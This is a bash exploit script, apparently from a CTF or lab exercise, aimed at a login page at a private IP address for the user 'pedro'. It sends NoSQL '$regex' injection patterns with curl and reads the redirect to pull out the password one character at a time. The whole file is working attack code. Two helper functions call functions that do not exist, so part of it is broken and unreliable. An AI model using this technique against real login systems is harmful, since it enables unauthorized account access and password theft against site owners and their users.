#!/usr/bin/env bash

ip='10.10.239.253'
url="http://$ip/login.php"
user='pedro'
password=''

function get_attempt()
{
        local a=$1
        pos=$2
        local limit=$3
        attempt="^$password$a"
        local remainder=$(($limit - $pos))
        for ((a=0;a<$remainder;a++)); do
                attempt+='.'
        done
        echo "Attempting $attempt"
}

function test_position()
{
        pos=$1
        limit=$2
	chars=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z" 0 1 2 3 4 5 6 7 8 9)
        echo "Testing position $pos"
        for a in ${chars[@]}; do
                get_attempt $a $pos $limit
                response=$(curl -sL "$url" -d "user=$user" -d "pass[\$regex]=$attempt" -vvvv --stderr -)
                if $(get_location "$response"); then
                        echo "Found: $a"
                        password+=$a
                        return 0
                fi
        done
}

function brute_force_password_position()
{
        length=$(($1 - 1))
        for ((i=0;i<=$length;i++)); do
                echo "Trying position $i of $length"
                test_position "$i" "$length"
                echo "Current Password: $password"
        done
}

function enumerate_password_length()
{
        for i in {1..10}; do
                test_password $i
        done
}

function get_location()
{
        response=$1
        loc=$(grep -oP '(?<=Location: /)[a-zA-Z0-9=\.\?]+' <<< "$response")
        endpoint="${loc//$'\n\t\f'//}"
        if [[ "$endpoint" == "?err=1" ]]; then
                return 1
        else
                return 0
        fi
}

function test_password_length()
{
        num=$1
        response=$(curl -sL "$url" -d "user=$user" -d "pass[\$regex]=^.{$num}" -vvvv --stderr -)
        loc=$(grep -oP '(?<=Location: /)[a-zA-Z0-9=\.\?]+' <<< "$response")
        endpoint="${loc//$'\n\t\f'//}"
        if [[ $(location_check "$response") ]]; then
                echo "Password length: $(($num - 1))"
                exit
        fi
}

# enumerate_password_length
brute_force_password_position 15
